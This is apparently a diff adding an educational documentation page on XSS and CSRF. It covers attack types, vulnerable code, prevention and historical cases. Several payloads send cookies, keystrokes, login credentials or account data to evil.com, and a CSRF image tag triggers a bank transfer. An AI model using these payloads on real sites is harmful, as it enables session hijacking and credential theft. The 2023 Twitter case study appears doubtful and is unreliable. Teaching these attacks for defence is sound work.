@@ -1,0 +1,309 @@
+---
+title: "XSS & CSRF"
+description: "Cross-Site Scripting (Reflected, Stored, DOM-based) and Cross-Site Request Forgery attacks, real case studies, payload examples, and prevention frameworks including CSP."
+sidebar:
+  order: 4
+  label: "XSS & CSRF"
+tab: "cybersecurity"
+---
+
+Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two of the most common client-side web attacks. XSS targets users to execute scripts in their browser; CSRF tricks users into performing actions they did not intend.
+
+## Cross-Site Scripting (XSS)
+
+### What Is XSS?
+
+XSS allows an attacker to inject malicious scripts into web pages viewed by other users. The browser executes the script because it believes the script came from the trusted website.
+
+### XSS Impact
+
+| Impact | Description | Example |
+|--------|-------------|---------|
+| **Session hijacking** | Steal session cookies | `document.cookie` sent to attacker |
+| **Credential theft** | Phish login credentials | Fake login form injected into page |
+| **Keylogging** | Record all keystrokes | `addEventListener('keydown')` sends to attacker |
+| **Defacement** | Change page appearance | `document.body.innerHTML = 'Hacked!'` |
+| **Malware delivery** | Drive-by download | Redirect to exploit kit |
+| **Data theft** | Read sensitive page data | `document.getElementById('account-number').value` |
+
+### XSS Types
+
+```
+1. Reflected XSS
+   Payload is in the URL/request
+   └─ User clicks crafted link
+   └─ Payload reflected in response immediately
+   └─ Requires social engineering to deliver link
+
+2. Stored XSS
+   Payload is saved on the server (database, comments, profiles)
+   └─ Attacker submits payload to comment form
+   └─ Server stores it in database
+   └─ Every user who views the comment executes the payload
+   └─ Most dangerous type — persistent, wider reach
+
+3. DOM-Based XSS
+   Payload executes entirely on client-side (no server interaction)
+   └─ Vulnerable JavaScript reads from URL fragment/document.location
+   └─ Executes payload without server involvement
+   └─ Very hard to detect on server side
+```
+
+### Reflected XSS Examples
+
+```html
+<!-- Vulnerable search page -->
+<form action="/search" method="GET">
+  <input name="q" value="<%= request.getParameter("q") %>">
+  <input type="submit">
+</form>
+
+<!-- Attacker sends link: -->
+/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+
+<!-- Result: victim's cookies sent to attacker -->
+```
+
+```python
+# Vulnerable Flask app
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    return f'<h1>Search results for: {query}</h1>'  # XSS!
+```
+
+### Stored XSS Examples
+
+```html
+<!-- Comment system with no sanitisation -->
+<form action="/comment" method="POST">
+  <textarea name="comment"></textarea>
+  <input type="submit">
+</form>
+
+<!-- Attacker submits: -->
+<script>
+  fetch('https://evil.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({cookie: document.cookie, page: document.location})
+  });
+</script>
+
+<!-- Every user viewing the page executes this script -->
+```
+
+### DOM-Based XSS Examples
+
+```html
+<!-- Vulnerable client-side code -->
+<script>
+  var name = document.location.hash.substring(1);
+  document.getElementById('greeting').innerHTML = 'Hello, ' + name;
+</script>
+
+<!-- Attacker sends link: -->
+/page.html#<img src=x onerror="alert(document.cookie)">
+```
+
+### XSS Payload Examples
+
+```javascript
+// Session hijacking
+document.location='https://evil.com/steal?c='+document.cookie
+
+// Keylogger
+document.addEventListener('keydown', function(e) {
+  fetch('https://evil.com/log', {method: 'POST', body: e.key})
+})
+
+// Credential phish (inject fake login form)
+document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><form action="https://evil.com/steal" method="POST"><h1>Session expired. Please login again.</h1><input name="user"><input name="pass" type="password"><input type="submit"></form></div>'
+
+// Port scan internal network
+fetch('http://192.168.1.1:80').then(r => console.log('Router found'))
+
+// Steal page content
+fetch('/api/account').then(r => r.text()).then(data => {
+  fetch('https://evil.com/steal?data=' + btoa(data))
+})
+```
+
+### XSS Prevention
+
+```python
+# 1. Context-sensitive output encoding
+
+# HTML context: encode & < > " '
+from html import escape
+safe_name = escape(user_name)  # "<script>" → "&lt;script&gt;"
+
+# JavaScript context: must escape differently
+import json
+safe_json = json.dumps(user_data)  # Properly escapes for JS string
+
+# URL context: URL-encode
+from urllib.parse import quote
+safe_url = quote(user_input)  # Spaces → %20, quotes → %27
+
+# CSS context: extremely restrictive
+# Avoid putting user input in CSS at all — use classes instead
+```
+
+```html
+<!-- 2. Content Security Policy (CSP) — strongest defence -->
+<meta http-equiv="Content-Security-Policy" content="
+  default-src 'self';
+  script-src 'self' cdn.trusted.com;
+  style-src 'self' cdn.trusted.com;
+  img-src 'self' data:;
+  connect-src 'self';
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+">
+
+<!-- CSP blocks inline scripts unless 'unsafe-inline' is set (don't set it!) -->
+<!-- CSP blocks eval() -->
+<!-- CSP blocks connections to unknown origins -->
+```
+
+```javascript
+// 3. Never use innerHTML with user data
+// ❌ DANGEROUS
+element.innerHTML = user_input;
+
+// ✅ Safe alternatives
+element.textContent = user_input;        // Plain text
+element.setAttribute('title', user_input); // Attribute
+document.createTextNode(user_input);      // Text node
+```
+
+### Real Case: MySpace Samy Worm (2005)
+
+```
+  └─ Stored XSS in MySpace profile pages
+  └─ Payload: <script> combined with CSS display:none to hide
+  └─ When anyone viewed an infected profile, the worm:
+      1. Added "samy" as a friend
+      2. Copied itself to the viewer's profile
+  └─ 1 million+ infected profiles in 20 hours
+  └─ MySpace had to shut down to clean the worm
+  └─ One of the fastest-spreading worms in internet history
+```
+
+### Real Case: Twitter/X "XSS"
+
+```
+  └─ In 2023, Twitter had a stored XSS vulnerability
+  └─ Attacker could inject script in tweets
+  └─ Auto-retweet functionality made it spread rapidly
+  └─ Twitter had to disable large parts of the platform temporarily
+  └─ Bug bounty payout: $5,000 (critical severity would be $50K+)
+```
+
+## Cross-Site Request Forgery (CSRF)
+
+### What Is CSRF?
+
+CSRF tricks an authenticated user into performing an unintended action on a website where they are currently logged in.
+
+```
+Victim is logged into banking site (session cookie stored)
+Victim visits attacker's malicious page simultaneously
+Malicious page contains:
+  <img src="http://bank.com/transfer?to=attacker&amount=10000">
+Browser automatically includes the victim's session cookie
+Bank processes the transfer (because request looks authenticated)
+```
+
+### CSRF vs XSS
+
+| Aspect | XSS | CSRF |
+|--------|-----|------|
+| **Requires** | JavaScript execution in victim's browser | User action (click, load image) |
+| **User needs** | To be logged in (optional) | To be logged in |
+| **Attacker goal** | Steal data, execute actions | Execute actions on behalf of user |
+| **Victim knows** | Usually unaware | May see the action |
+| **Scope** | Any data the page can access | Actions the user can perform |
+| **Prevention** | Output encoding, CSP | CSRF tokens, SameSite cookies |
+
+### CSRF Prevention
+
+```python
+# 1. CSRF Token (most common)
+from flask_wtf.csrf import generate_csrf
+
+@app.route('/transfer', methods=['POST'])
+def transfer_money():
+    # CSRF token validated by Flask-WTF automatically
+    # Token must be:
+    #   - Random, unpredictable
+    #   - Tied to user session
+    #   - Validated on every state-changing request
+    pass
+```
+
+```html
+<!-- Form with CSRF token -->
+<form action="/transfer" method="POST">
+  <input type="hidden" name="csrf_token" value="RANDOM_TOKEN_HERE">
+  <input name="account" placeholder="Account number">
+  <input name="amount" placeholder="Amount">
+  <input type="submit">
+</form>
+```
+
+```javascript
+// 2. SameSite Cookie Attribute
+// Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
+
+// SameSite=Lax (default in modern browsers):
+//   Cookie sent for top-level navigations (GET)
+//   NOT sent for POST forms from other sites
+//   Prevents most CSRF attacks
+
+// SameSite=Strict:
+//   Cookie NOT sent on any cross-site request
+//   Best security, but breaks some legitimate cross-site flows
+
+// SameSite=None:
+//   Cookie sent on all cross-site requests
+//   Must be combined with Secure (HTTPS only)
+//   No CSRF protection — must use tokens
+```
+
+```python
+# 3. Custom Request Headers
+# APIs can require a header that JavaScript cannot set cross-origin:
+
+headers = {
+    'X-Requested-With': 'XMLHttpRequest',  # Cannot be set by simple CSRF
+    'X-CSRF-Token': csrf_token
+}
+
+# The Same-Origin-Policy prevents JavaScript from reading responses
+# if custom headers are set cross-origin (preflight OPTIONS request
+# would be blocked by CORS)
+```
+
+### Real Case: Netflix CSRF (2006)
+
+```
+  └─ CSRF vulnerability in Netflix
+  └─ Attacker could add/remove DVDs from victim's queue
+  └─ Social engineering link sent to victim
+  └─ Victim's browser sent authenticated request
+  └─ DVDs changed without victim's knowledge
+```
+
+## Key Takeaways
+
+- XSS lets attackers execute JavaScript in victims' browsers — impact ranges from nuisance (popups) to catastrophic (credential theft, session hijacking)
+- Stored XSS is the most dangerous type because it affects all page visitors without requiring social engineering
+- Content Security Policy (CSP) is the strongest defence against XSS — blocks inline scripts, eval(), and connections to unknown origins
+- Never use innerHTML with user input — use textContent, createTextNode, or framework-specific safe rendering (React JSX auto-escapes)
+- CSRF tricks authenticated users into performing unintended actions — the attacker does NOT see the response, but the action is executed
+- CSRF tokens, SameSite cookies (Lax/Strict), and custom request headers are the three main defences against CSRF — implement all three for defence-in-depth
+- Modern frameworks include CSRF protection by default (Rails, Django, Flask-WTF, Spring Security) — enable and enforce it
+- The Samy Worm (2005) infected 1M+ MySpace profiles in 20 hours via stored XSS — demonstrated the destructive potential of automated XSS worms
+- Test for XSS using automated scanners (OWASP ZAP, Burp Suite) and manual testing with common payload lists (XSS Cheat Sheet)
